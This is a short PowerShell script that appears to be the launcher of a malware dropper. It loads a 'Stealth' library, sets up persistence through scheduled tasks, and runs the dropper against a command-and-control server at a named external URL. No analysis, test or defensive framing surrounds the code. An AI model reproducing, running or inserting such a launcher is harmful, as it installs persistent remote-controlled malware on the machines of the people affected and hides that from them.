. "$PSScriptRoot\lib\Stealth.ps1"

$dropper = New-Object Dropper(
    (New-Object SchTasksPersistence)
)

$dropper.Run("http://c2.ginga.dev:8080")
